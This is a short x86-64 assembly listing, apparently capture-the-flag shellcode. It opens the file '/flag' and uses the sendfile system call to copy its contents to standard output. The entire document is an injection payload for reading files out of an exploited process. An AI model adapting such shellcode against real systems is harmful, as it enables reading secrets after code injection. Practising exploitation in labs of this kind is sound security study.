.intel_syntax noprefix

inc rax
inc rax
mov rbx, 0x00000067616c662f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

xor rdi, rdi
inc rdi
mov rsi, rax
xor rax, rax
mov al, 40
mov r10b, 0x80
syscall
















